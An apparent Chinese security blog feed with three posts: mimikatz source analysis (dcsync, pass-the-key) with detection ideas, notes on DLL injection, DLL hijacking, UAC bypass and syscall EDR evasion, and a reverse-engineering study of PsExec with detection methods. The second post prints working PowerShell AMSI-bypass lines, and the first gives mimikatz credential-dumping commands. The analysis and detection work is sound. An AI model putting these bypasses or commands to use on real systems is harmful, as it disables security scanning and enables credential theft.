*GetSidSubAuthorityCount(data) - <span class="number">1</span>)<span class="comment">;</span></div><div class="line">kprintf(L<span class="string">"Object Relative ID   : %u\n"</span>, rid)<span class="comment">;</span></div><div class="line">kprintf(L<span class="string">"\nCredentials:\n"</span>)<span class="comment">;</span></div><div class="line">if(kull_m_rpc_drsr_findMonoAttr(<span class="keyword">prefixTable, </span>attributes, szOID_ANSI_unicodePwd, &amp;encodedData, &amp;encodedDataSize))</div><div class="line">kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L<span class="string">"NTLM"</span>, FALSE)<span class="comment">;</span></div><div class="line">if(kull_m_rpc_drsr_findMonoAttr(<span class="keyword">prefixTable, </span>attributes, szOID_ANSI_ntPwdHistory, &amp;encodedData, &amp;encodedDataSize))</div><div class="line">kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L<span class="string">"ntlm"</span>, TRUE)<span class="comment">;</span></div><div class="line">if(kull_m_rpc_drsr_findMonoAttr(<span class="keyword">prefixTable, </span>attributes, szOID_ANSI_dBCSPwd, &amp;encodedData, &amp;encodedDataSize))</div><div class="line">kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L<span class="string">"LM  "</span>, FALSE)<span class="comment">;</span></div><div class="line">if(kull_m_rpc_drsr_findMonoAttr(<span class="keyword">prefixTable, </span>attributes, szOID_ANSI_lmPwdHistory, &amp;encodedData, &amp;encodedDataSize))</div><div class="line">kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L<span class="string">"lm  "</span>, TRUE)<span class="comment">;</span></div></pre></td></tr></table></figure></li></ul><h3 id="kerberos-golden-源码分析"><a href="#kerberos-golden-源码分析" class="headerlink" title="kerberos::golden 源码分析"></a>kerberos::golden 源码分析</h3><ul><li><a href="https://www.anquanke.com/post/id/257703" target="_blank" rel="external">mimikatz源码学习-Kerberos模块</a></li><li><a href="http://evilash.me/2021/12/24/Analyse-NoPac.html" target="_blank" rel="external">解析CVE-2021-42278和CVE-2021-42287</a>主要学习PAC结构</li></ul><h3 id="Pass-The-Ticket-检测"><a href="#Pass-The-Ticket-检测" class="headerlink" title="Pass The Ticket 检测"></a>Pass The Ticket 检测</h3><ul><li>在域控侧</li><li>1.在前期(也就是lsadump::dcsync)，通过检测流量定位DsGetNcChanges流量，判断来源IP是否是已知的域控ip地址。</li><li>2.在中期(也就是kerseros::ptt命令），通过检测流量，寻找在通讯流量中，缺省Kerberos通讯过程中第二第二步。因为黄金票据是伪造TGT的，自然不会有TGT请求的流量。</li><li>3.在后期，通过获取windows 事件，寻找关键的日志ID，进行分析<ul><li>3.1 寻找关键的ID(例如4769)</li><li>3.2 ID为4769的Kerberos登录事件中，登录的账户不在域中，说明是伪造的！因为这个账户可以是任意的<br>在非域控侧<br>1.检测mimikatz工具(有特征，例如yara，或者命令行)</li></ul></li></ul><h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><h3 id="Pass-The-Key"><a href="#Pass-The-Key" class="headerlink" title="Pass The Key"></a>Pass The Key</h3><ul><li>又称为OverPass-The-Hash，因为在安装了KB2871997补丁的系统中，常规的非Administator账户是无法使用PtH进行横向传播的，但是可以使用AES进行Pth。</li><li>mimikatz “privilege::debug” “sekurlsa::ekeys” 获取想要的AES Hash</li><li>mimikatz sekurlsa::pth 进行PtK攻击</li></ul><h2 id="mimikatz检测与防御"><a href="#mimikatz检测与防御" class="headerlink" title="mimikatz检测与防御"></a>mimikatz检测与防御</h2><ul><li>yara检测:<a href="https://github.com/gentilkiwi/mimikatz/blob/master/kiwi_passwords.yar" target="_blank" rel="external">https://github.com/gentilkiwi/mimikatz/blob/master/kiwi_passwords.yar</a>,原理是检测LogonSessionList全局变量的特征码。</li></ul><h2 id="lsadump-sam-源码分析"><a href="#lsadump-sam-源码分析" class="headerlink" title="lsadump::sam 源码分析"></a>lsadump::sam 源码分析</h2><ul><li>Ref<a href="https://zhuanlan.zhihu.com/p/34991269" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/34991269</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;这是学习Mimikatz工作原理的无总结笔记。主要包含了&lt;code&gt;sekurlsa::msv&lt;/code&gt;,&lt;code&gt;sekurlsa::pth&lt;/code&gt;,&lt;code&gt;lsadump::dcsync&lt;/code&gt;,票据传递等功能的原理分析和检测。
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>绿盟科技-每周蓝军技术推送（2022.4.9-4.15）学习</title>
    <link href="https://findream.github.io/2022/04/20/%E7%BB%BF%E7%9B%9F%E7%A7%91%E6%8A%80-%E6%AF%8F%E5%91%A8%E8%93%9D%E5%86%9B%E6%8A%80%E6%9C%AF%E6%8E%A8%E9%80%81%EF%BC%882022.4.9-4.15%EF%BC%89/"/>
    <id>https://findream.github.io/2022/04/20/绿盟科技-每周蓝军技术推送（2022.4.9-4.15）/</id>
    <published>2022-04-20T06:02:11.000Z</published>
    <updated>2022-05-23T11:44:50.895Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-绿盟科技-每周蓝军技术推送（2022-4-9-4-15）"><a href="#0x00-绿盟科技-每周蓝军技术推送（2022-4-9-4-15）" class="headerlink" title="0x00 绿盟科技-每周蓝军技术推送（2022.4.9-4.15）"></a>0x00 绿盟科技-每周蓝军技术推送（2022.4.9-4.15）</h2><ul><li>原文链接：<a href="https://mp.weixin.qq.com/s/LN8k0J4lOn-ZV5LmDfSTBQ" target="_blank" rel="external">每周蓝军技术推送（2022.4.9-4.15）</a></li></ul><a id="more"></a><h2 id="0x01-修改内存中的-PE-头来注入-DLL-的一种方法"><a href="#0x01-修改内存中的-PE-头来注入-DLL-的一种方法" class="headerlink" title="0x01 修改内存中的 PE 头来注入 DLL 的一种方法"></a>0x01 修改内存中的 PE 头来注入 DLL 的一种方法</h2><ul><li><p><a href="https://www.x86matthew.com/view_post?id=import_dll_injection" target="_blank" rel="external">这篇文章</a>主要原理是：windows在装载程序的时候会根据导入表的数据装载所需要的Dll文件，<br>这篇文章的原理是通过在程序导出表中添加IID数组，然后在Resume主线程的时候，windows装载器便会加载所需要的dll实现dll注入。</p></li><li><p>这个办法缺点：</p><ul><li>1.是只能注入刚刚启动的进程，</li><li>2.还有敏感函数ResumeThead操作。好处就是不需要CreateRemoteThread函数。</li></ul></li></ul><h2 id="0x02-针对Office的DLL劫持研究"><a href="#0x02-针对Office的DLL劫持研究" class="headerlink" title="0x02 针对Office的DLL劫持研究"></a>0x02 针对Office的DLL劫持研究</h2><ul><li><p><a href="https://medium.com/@tamirye94/office-multiple-search-order-dll-hijacking-67e76001ecf1" target="_blank" rel="external">这篇文章</a>就讲了一个搜索顺序类型的dll劫持，而且现在微软并不认为这算是一个漏洞，所以短时间内应该是不会进行修复的。关于这种类型的dll劫持的检测思路可以是这样的：</p></li><li><p>因为Windows安全dll搜索顺序是这样，针对系统程序来说，其使用的dll多位于系统目录，要想目标dll能被劫持，目标dll的释放路径只可能在应用程序目录。</p><pre><code>1、加载应用程序的目录；2、系统目录，使用GetSystemDirectory函数获取该目录的路径；3、16位系统目录，没有获取该目录路径的函数，但会对该目录进行搜索；4、Windows目录，使用GetWindowsDirectory函数获取该目录的路径；5、当前目录；6、PATH环境变量中列出的目录。</code></pre></li><li>所以，我只需要寻找进程所加载dll的路径和进程路径一致的dll程序，并且在其他目录存在相同文件名称的dll，例如%system32%目录和%windows%。即可认为存在此类dll劫持。</li></ul><h2 id="0x03-AMSI-Bypass-的多种方法整理"><a href="#0x03-AMSI-Bypass-的多种方法整理" class="headerlink" title="0x03 AMSI Bypass 的多种方法整理"></a>0x03 AMSI Bypass 的多种方法整理</h2><ul><li><p>结合<a href="https://www.hackingarticles.in/a-detailed-guide-on-amsi-bypass/" target="_blank" rel="external">这篇文章</a>，目前主要的ByPass AMSI的方法有两种，第1种是Patch amsi.dll文件。第2种是使amsi失效的方法。</p></li><li><p>1.通过patch AmsiScanBuffer函数，主要分为c#语言和ps语言。</p></li></ul><p>ref:<a href="https://gist.github.com/FatRodzianko/c8a76537b5a87b850c7d158728717998#file-my-am-bypass-ps1" target="_blank" rel="external">https://gist.github.com/FatRodzianko/c8a76537b5a87b850c7d158728717998#file-my-am-bypass-ps1</a></p><p>ref:<a href="https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs" target="_blank" rel="external">https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs</a></p><ul><li>2.通过反射Patch AmsiScanBuffer函数地址，为了避免被探测，其首先获取了DllGetClassObject的地址，然后通过暴力搜索特征码的方式获取AmsiScanBuffer进行patch</li></ul><p>ref:<a href="https://gist.github.com/shantanu561993/6483e524dc225a188de04465c8512909" target="_blank" rel="external">https://gist.github.com/shantanu561993/6483e524dc225a188de04465c8512909</a></p><ul><li>3.使amsi失效，通过设置System.Management.Automation.AmsiUtils的属性amsiInitFailed或者amsiContext使AMSI失效。</li></ul><p>[Ref].Assembly.GetType(‘System.Management.Automation.AmsiUtils’).GetField(‘amsiInitFailed’,’NonPublic,Static’).SetValue($null,$true)</p><p>Ref:<a href="https://github.com/samratashok/nishang/blob/master/Bypass/Invoke-AmsiBypass.ps1" target="_blank" rel="external">https://github.com/samratashok/nishang/blob/master/Bypass/Invoke-AmsiBypass.ps1</a></p><ul><li>使amsi失效，该方法会导致异常，而且windows已经针对部分字符串进行检测。但是可以混淆绕过。</li></ul><figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$mem</span> = [System.Runtime.InteropServices.Marshal]<span class="symbol">:</span><span class="symbol">:AllocHGlobal</span>(<span class="number">9076</span>)</div><div class="line">[Ref].Assembly.GetType(<span class="string">"System.Management.Automation.AmsiUtils"</span>).GetField(<span class="string">"amsiSession"</span>,<span class="string">"NonPublic,Static"</span>).SetValue(<span class="variable">$null</span>, <span class="variable">$null</span>);</div><div class="line">[Ref].Assembly.GetType(<span class="string">"System.Management.Automation.AmsiUtils"</span>).GetField(<span class="string">"amsiContext"</span>,<span class="string">"NonPublic,Static"</span>).SetValue(<span class="variable">$null</span>, [IntPtr]<span class="variable">$mem</span>)</div></pre></td></tr></table></figure><h2 id="0x04-Windows特权句柄利用分析"><a href="#0x04-Windows特权句柄利用分析" class="headerlink" title="0x04 Windows特权句柄利用分析"></a>0x04 Windows特权句柄利用分析</h2><ul><li><p><a href="https://mp.weixin.qq.com/s/VJEgxfcuDRKMGBdkrXyRlA" target="_blank" rel="external">这篇文章</a>所描述的是，通过Hunt系统中的高完整性级别的句柄，来进行ByPass UAC。其原理和之前推得一篇文章很相似。<br>那篇原理是通过拉起某些自动提升UAC权限的进程，然后通过dump进程句柄实现的。这篇是寻找高完整性句柄，并以此启动进程进行ByPassUAC。</p></li><li><p>再讲一下为什么只需要获取高完整性级别的Handle就可以进行ByPass UAC。ByPassUAC原理就是父子进程的完整性级别是继承的，在创建进程之前的CreateProcess函数，会设置一个名为STARTUPINFOEXW结构体。其保存了一些启动信息。当我们创建进程之前，提前设置STARTUPINFOEXW的lpAttributeList元素，就可以是新创建的进程具有使用泄露句柄的进程完整性级别。关于UpdateProcThreadAttribute用法，可以看这篇文章<a href="https://blog.csdn.net/linlin003/article/details/108864860" target="_blank" rel="external">https://blog.csdn.net/linlin003/article/details/108864860</a></p></li></ul><h2 id="0x05-探索Windows-内核中的系统调用"><a href="#0x05-探索Windows-内核中的系统调用" class="headerlink" title="0x05 探索Windows 内核中的系统调用"></a>0x05 探索Windows 内核中的系统调用</h2><ul><li><p>这篇文章主要讲的是通过syscall绕过EDR产品的原理，因为EDR或者杀毒软件通常会在一些敏感函数下Hook，部分杀软Hook的地方比较偏向应用层，因为内核层搞事情容易蓝屏，而syscall位于ntdll中的Nt*函数，通过直接调用Nt函数，这样就可以绕过部分杀毒软件。</p></li><li><p>目前来说，我比较看好的项目<a href="https://github.com/jthuraisamy/SysWhispers2" target="_blank" rel="external">SysWhisoers2 </a>，国内有大佬也总结了syscall几个很好的项目。<a href="https://tttang.com/archive/1464/#toc_syswhisoers2" target="_blank" rel="external">syscall的前世今生</a></p></li><li><p>但是，Syscall Bypass这种技术，目前对于普通使用者来说难度较大，因为Nt*更接近于底层，没有暴露的API接口使用，部分结构体甚至没有公布，只能通过Re的方法进行了解。所以，需要自己写一套Stub去调用Nt函数。</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-绿盟科技-每周蓝军技术推送（2022-4-9-4-15）&quot;&gt;&lt;a href=&quot;#0x00-绿盟科技-每周蓝军技术推送（2022-4-9-4-15）&quot; class=&quot;headerlink&quot; title=&quot;0x00 绿盟科技-每周蓝军技术推送（2022.4.9-4.15）&quot;&gt;&lt;/a&gt;0x00 绿盟科技-每周蓝军技术推送（2022.4.9-4.15）&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;原文链接：&lt;a href=&quot;https://mp.weixin.qq.com/s/LN8k0J4lOn-ZV5LmDfSTBQ&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;每周蓝军技术推送（2022.4.9-4.15）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>深度剖析PsExec</title>
    <link href="https://findream.github.io/2021/12/24/%E6%B7%B1%E5%85%A5%E5%89%96%E6%9E%90PsExec/"/>
    <id>https://findream.github.io/2021/12/24/深入剖析PsExec/</id>
    <published>2021-12-24T12:45:11.000Z</published>
    <updated>2022-11-12T06:58:10.534Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x1-前言"><a href="#0x1-前言" class="headerlink" title="0x1 前言"></a>0x1 前言</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本文主要通过逆向分析的方法分析PsExec的技术实现和有关PsExec和类PsExec工具的检测方法，当然其中也会掺杂一些乱七八糟的点，都是学习PsExec的一些总结。本文行文仓促，如有错误，请各位积极指正。</p><a id="more"></a><h2 id="0x2-什么是PsExec"><a href="#0x2-什么是PsExec" class="headerlink" title="0x2 什么是PsExec"></a>0x2 什么是PsExec</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在微软文档中，PsExec 是一种轻量级的 telnet 替代品，可让您在其他系统上执行进程，并与控制台应用程序完全交互，而无需手动安装客户端软件。国内也有很多大佬写过PsExec原理分析的文章，RcoIl通过分析数据包的方式为我们介绍了PsExec实现的原理。具体可以参考<a href="http://rcoil.me/2019/08/【知识回顾】深入了解%20PsExec/" target="_blank" rel="external">http://rcoil.me/2019/08/【知识回顾】深入了解%20PsExec/</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RcoIl通过分析流量，大致将PsExec的执行过程分为3个部分,而PSEXESVC 服务充当一个重定向器（包装器）。它在远程系统上运行指定的可执行文件</p><ul><li>将 PSEXESVC.exe 上传到 ADMIN$ （指向 /admin$/system32/PSEXESVC.EXE）共享文件夹内</li><li>远程创建用于运行 PSEXESVC.exe 的服务</li><li>远程启动服务</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;总结一下，就是PsExec通过ADMIN$将一个PSEXESVC文件上传到目标机器，然后通过命名管道的机制，将攻击者输入的命令重定向执行被攻击者机器的文件。但是实际上我还是不知道PsExec是怎么通过ADMIN$进行上传文件的，也不知道怎么通过管道机制使被攻击者机器执行命令的。</p><h2 id="0x3-如何传递PsExecSvr"><a href="#0x3-如何传递PsExecSvr" class="headerlink" title="0x3 如何传递PsExecSvr"></a>0x3 如何传递PsExecSvr</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PsExec是Mark Russinovich编写的 Sysinternals Suite中的工具，可以在<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec" target="_blank" rel="external">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a>处下载。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除去对参数，和运行环境做一些校验外，直接定位到PsExec最为关键的代码sub_7040。<br>    <img src="http://hacky.wang/blog/20210627/HYIGiuLiGr31.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在sub_7040，首先会构造远程文件的地址，然后将服务名，服务文件路径，用户名，密码等相关信息作为参数传入sub_41D0。而sub_41D0这个函数正是投送PSEXESVC.exe的原因所在。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，sub_41D0会将参数重新赋值到局部变量，这是很常见的操作，这些变量分别是</p><ul><li>filepath_svcpe：即PSEXESVC.exe文件的路径</li><li>lpDisplayName：即服务的DisplayName，友好名称</li><li>psz_PSEXESVC：就是那串字符串，表示文件名(一般为PSEXESVC.exe)</li><li>RemoteComputerName：远程主机名</li><li>lpUserName：用户名</li><li>lpPassWord：密码</li><li>lpServiceName：服务名<br>  <img src="http://hacky.wang/blog/20210627/3d2u7mXrPerT.png?imageslim" alt="mark"></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着判断远程主机名是否就是本地主机名，如果是本地主机的话，就会通过gethostname，gethostbyname，inet_ntoa等函数转化为点分十进制地址，然后进行下一步的链接。当然，如果远程主机就是本地主机的话是不需要将PSEXESVC.exe直接上传到远程主机的，所以直接创建进程<br>    <img src="http://hacky.wang/blog/20210627/TideqtWTknz1.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果待定的远程主机名不是本地主机名的话，执行开线程链接。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在Thread_ConnectRemoteHostBySMB2(相对地址为0x4A50)中，首先建立IPC$连接，并从资源中释放PSEXESVC.exe<br>    <img src="http://hacky.wang/blog/20210627/xL6c7yimyDQR.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20210627/3rPBOidtreM1.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当PSEXESVC.exe释放之后，创建DisplayName = “PSEXESVC”的服务<br>    <img src="http://hacky.wang/blog/20210627/Qq0kSCgl8c7h.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后向远程主机创建authentication key<br>    <img src="http://hacky.wang/blog/20210627/nRJY9bL4cWI4.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着通过CopyFileW直接复制到远程主机路径，亦可通过WriteFile写入远程主机<br>    <img src="http://hacky.wang/blog/20210627/s2SVzF5Ngp7K.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20210627/LWHQcxwSk9dg.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着创建三个命名管道用于和PSEXESVC进行通讯，分别是stdin，stdout，stderr<br>     <img src="http://hacky.wang/blog/20210627/JgHqfs9uRAju.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;随后分别拉起三个线程，用于三个命名管道的数据传输(并不是这三个管道之间进行传输)，第一个参数为phKey，如果有phkey则需要将数据解密在进行传输，否则的话直接进行传输即可，第二个参数管道句柄。<br>     <img src="http://hacky.wang/blog/20210627/HAQhx6YIHQnj.png?imageslim" alt="mark"><br>     <img src="http://hacky.wang/blog/20210627/yVFrVO5Gq9IB.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;剩下的就是一些退出操作，比如停止及删除服务，删除文件等操作<br>     <img src="http://hacky.wang/blog/20210627/Xjk0cWLfWuer.png?imageslim" alt="mark"><br>     <img src="http://hacky.wang/blog/20210627/FpNDmhsL2ITM.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;值得注意的是，PsExec使用了ADMIN$传输PSEXESVC.exe，但是仅仅使用WNetAddConnection2W添加了一个关于IPC$的链接，并在退出之时关闭了IPC$的链接。<br>     <img src="http://hacky.wang/blog/20210627/PL6PjMk5j6Gm.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;总结一下，其实PsExec就是通过Admin$共享将文件传输到远程主机，Admin$相当于虚拟了一个文件夹，也可以理解成Admin$是C:\Windows的符号链接。如果将Admin$理解成一个符号链接，并指向的是C:\Windows，那么我们可以在上面执行任何关于文件的操作，包括创建,写入,删除文件,这些都是可以通过Windows提供的API实现。Admin$本质其实是利用SMB协议实现的，当我去链接windowx xp的机器的时候，可以看到使用的是SMB1的协议，而当我链接windows7的时候使用的却是SMB2的协议。<br>    <img src="http://hacky.wang/blog/20210627/RcTR0DRWnj8L.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有师傅也注意到了，为什么使用Admin$上传文件，但是为什么不需要使用WNetAddConnection2W添加一个Admin$链接。这也是我在分析时候的一个困惑，于是，我做了以下实验。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，使用net use \192.168.80.128\ipc$ “password” /user:”domain/username”建立一个远程连接。<br>    <img src="http://hacky.wang/blog/20210627/ltyd7jhtInfF.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后上传一份文件上去,可以看见文件以及上传成功。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">CopyFile(<span class="string">"图19.png"</span>,<span class="string">"<span class="subst">\\</span><span class="subst">\\</span>192.168.80.128<span class="subst">\\</span>admin$<span class="subst">\\</span>aaa.png"</span>,<span class="literal">FALSE</span>)</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>    <img src="http://hacky.wang/blog/20210627/KG1dSP0DTxxe.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着，我删除上述链接，并创建一个Admin$的远程链接，然后在上传一份bbb.png的文件，可以发现无论ipc$还是admin$都是可以上传成功的。我觉得ipc$亦或是admin$在此处的作用都是为了验证用户名和密码是否有效，验证完成之后，可以直接通过Admin$上传文件。这也是有的文章上面说可以先建立一个ipc$链接，然后在执行PsExec的原因所在了。<br>    <img src="http://hacky.wang/blog/20210627/Hv2iqmDQGOBp.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除此以外，为什么一定是要利用创建服务的方式去实现呢，实现驻留的方法也有很多，但为什么一定是服务呢，我在<a href="http://www.intelliadmin.com/index.php/2007/10/the-admin-share-explained/" target="_blank" rel="external">这篇文章</a>中找到了原因，当使用Admin$共享的时候，如果要执行复制到远程主机的文件的时候，这些文件之一必须是服务。</p><h2 id="0x4-如何执行命令"><a href="#0x4-如何执行命令" class="headerlink" title="0x4 如何执行命令"></a>0x4 如何执行命令</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;传递和返回结果的原理就很简单了，本质就如很多文章所说的，通过命名管道实现从本地主机到远程主机发送和接收数据。具体是这样的。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先分别创建stdin，stdout，stderr三个管道，并连接这三个命名管道用于接收和传递数据!<br>    <a href="http://hacky.wang/blog/20210711/v5IxhMxmTGkm.png?imageslim" target="_blank" rel="external">mark</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后传递一些参数进sub_67B0中，这些参数分别是：</p><ul><li>phKey,</li><li>&amp;Msg,</li><li>hPipe_Service,</li><li>hNamedPipe_stdin,</li><li>hNamedPipe_stdout,</li><li>hNamedPipe_stderr,</li><li>hEvent,</li><li>hHandle<br>  <img src="http://hacky.wang/blog/20210711/PeLFcFJGY1At.png?imageslim" alt="mark"></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先phKey是表示秘钥句柄，其可能是通过sub_404420中的CryptDeriveKey，或者是sub_4059C0中的CryptImportKey函数产生。<br>    <img src="http://hacky.wang/blog/20210711/tssdODMiAqm8.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;了解&amp;Msg参数，其实是需要了解第三个参数hPipe_Service。hPipe_Service其实是服务于服务本身的一个管道，PsExec一共会创建四个管道，其中一个用于服务自身，另外三个管道用于重定向。因为这个管道是以模块名为管道名称的，所以这个管道是服务于自身的一个管道。<br>    <img src="http://hacky.wang/blog/20210711/Wt0Ci2NDWGh8.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着看Msg就很好理解了，在sub_404720中，第二个参数是服务本身的管道，显然，这是从管道中读取相关信息。<br>    <img src="http://hacky.wang/blog/20210711/nWM5Ko8lg9zK.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下来就是三个用于转发的管道，和事件句柄和线程句柄，和本文并没有多少关系。<br>    <img src="http://hacky.wang/blog/20210711/1WkoWRaBoCj4.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在sub_405AF0函数中，创建三个普通的管道，这三个管道并不是命名管道，作用是用于向进程发送数据，以及接受返回结果的作用。可以看到StartupInfo的dwFlags是USESHOWINDOW &amp; USESTDHANDLES。USESTDHANDLES表示着需要使用进程的三个管道。<br>    <img src="http://hacky.wang/blog/20210711/W8P72SdgqeXX.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着拉起三个线程，用于从普通管道读取数据，然后将数据写回到命名管道中，完成数据的传递。<br>    <img src="http://hacky.wang/blog/20210711/iHDFJxc6k3Nj.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后创建进程，后续三个线程监听管道的数据即可。<br>    <img src="http://hacky.wang/blog/20210711/nFar24tJw0Af.png?imageslim" alt="mark"></p><h2 id="0x5-如何检测PsExec"><a href="#0x5-如何检测PsExec" class="headerlink" title="0x5 如何检测PsExec"></a>0x5 如何检测PsExec</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在前面，我们了解到PsExec通过SMB协议将PSEXESVC.exe传递到远程主机，并将其创建为一个服务，然后通过创建四个命名管道进行数据通信，然后通过CreateProcessAsUser创建带有管道的进程来监听或者发送命令。所以综上，我们可以通过三个维度来检测是否是PsExec程序。</p><ul><li>创建的子进程是否存在管道</li><li>父进程也就是PSEXESVC.exe，是否是服务</li><li>父进程是否存在命名管道</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;经过测试，对于类似于PsExec一样是可以检测的。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据之前的分析，PsExec最终会调用CreateProcessAsUserW拉起进程，并在StartupInfo设置重定向管道。所以，我们可以在通过Hook CreateProcessAsUserW函数或者类似函数CreateProcess，判断StartUpinfo是否存在重定向管道。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过分析CreateProcessAsUserW函数和CreateProcess函数发现，其最终会调用CreateProcessInternalW函数。并发现，其最终会调用Nt层的函数NtCreateUserProcess实现进程创建。<br>    <img src="http://hacky.wang/blog/20210718/wkJPdLW2156h.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20210718/rEDn0uWoryBR.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为不仅要考虑PsExec，还要考虑其他类似于PsExec的工具，我打算在Nt层进行Hook。所以，我决定将NtCreateUserProcess作为我的目标</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下来就是确定参数StartUpInfo这个参数是如何传递给NtCreateUserProcess的，通过分析lpStartupInfo会最终传递到BasepCreateProcessParameters函数处理，然后返回。然后再将返回的ProcessParameters作为参数传递给NtCreateUserProcess。<br>    <img src="http://hacky.wang/blog/20210718/xnXeOIfdKbq5.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20210718/eWeCzUzi9o42.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在BasepCreateProcessParameters中，发现其就是在StartupInfo做了校验和复制。<br>    <img src="http://hacky.wang/blog/20210718/0M5lYKnDpwwd.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于了解windows内核的师傅，肯定了解其中的运行机制，也了解ProcessParameters结构的内容<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div 